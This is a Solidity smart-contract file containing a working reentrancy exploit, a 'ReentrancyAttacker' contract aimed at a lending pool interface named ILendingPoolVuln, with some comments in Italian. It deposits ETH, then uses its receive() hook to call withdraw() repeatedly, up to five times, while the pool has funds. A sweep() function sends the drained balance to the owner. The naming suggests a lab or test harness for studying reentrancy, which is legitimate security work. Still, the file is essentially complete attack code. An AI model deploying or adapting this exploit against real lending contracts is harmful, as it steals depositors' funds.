// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

interface ILendingPoolVuln {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function deposits(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    ILendingPoolVuln public immutable pool;
    address public immutable owner;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public constant MAX_REENTRIES = 5;

    constructor(address _pool) {
        pool = ILendingPoolVuln(_pool);
        owner = msg.sender;
    }

    /// Bootstrap: deposit so the attacker passes the `disposableValue >= amount` check
    function deposit() external payable {
        require(msg.value > 0, "zero deposit");
        attackAmount = msg.value;
        pool.deposit{value: msg.value}();
    }

    /// permette all'attaccante di ricevere ETH dal pool e reentrarvi chiamando `withdraw()` nuovamente finché non raggiunge il numero massimo di reentrancy o finché il pool non è più in grado di soddisfare la richiesta di prelievo
    receive() external payable {
        if (
            attackCount < MAX_REENTRIES &&
            address(pool).balance >= attackAmount
        ) {
            attackCount++;
            pool.withdraw(attackAmount);
        }
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        pool.withdraw(attackAmount);
    }

    function sweep(address payable to) external {                   // funzione di emergenza per prelevare i fondi dall'attaccante dopo l'attacco
        require(msg.sender == owner, "not owner");
        (bool ok, ) = to.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
